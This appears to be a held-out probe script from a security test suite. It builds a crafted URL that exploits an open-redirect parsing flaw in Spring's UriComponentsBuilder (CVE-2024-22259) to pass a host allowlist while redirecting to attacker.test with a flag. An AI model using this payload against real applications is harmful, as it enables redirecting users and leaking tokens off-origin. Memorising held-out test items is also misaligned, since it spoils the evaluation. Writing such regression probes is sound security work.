#!/usr/bin/env python3
r"""[HELD-OUT] CVE-2024-22259 residual for spring-uricomponentsbuilder-openredirect.

"This is the same as CVE-2024-22243, but with different input." (spring.io advisory CVE-2024-22259.)
The V1 (5.3.32) fix only removed "[" from the userinfo pattern; the userinfo regex still terminates on
"@" and HOST_IPV4 still terminates on "[". A DIFFERENT crafted input revives the exact same mismatch:

    url = http://@trusted.internal[@attacker.test/?<FLAG>

On V1 (5.3.32): the leading "@" makes userinfo="" (userinfo regex "([^@/?#]*)" matches empty, then "@"),
so the host is parsed from "trusted.internal[..." and HOST_IPV4 "[^\[/?#:]*" stops at "[" =>
getHost()=="trusted.internal" -> allowlist passes -> Location carries FLAG, off-origin to attacker.test.
A browser resolves everything before the LAST "@" as userinfo => real host = attacker.test. BYPASS.

On V2 (5.3.33): CVE-2024-22259 fix removes "@" from userinfo ("([^/?#]*)") and "[" from HOST_IPV4
("[^/?#:]*"), so userinfo="@trusted.internal[" and getHost()=="attacker.test" -> 403. Closed.
"""

ALLOWED_HOST = "trusted.internal"
ATTACKER_HOST = "attacker.test"


def candidate(flag: str) -> dict:
    return {
        "probe_id": "cve-2024-22259-residual",
        "path": "/redirect",
        # Leading "@" empties userinfo on 5.3.32 so the host parse restarts at trusted.internal and
        # HOST_IPV4 still stops at "[" => getHost()=="trusted.internal" (the residual the 22243 fix missed).
        "url": f"http://@{ALLOWED_HOST}[@{ATTACKER_HOST}/?{flag}",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate("PCBFLAG_demo"), indent=2))
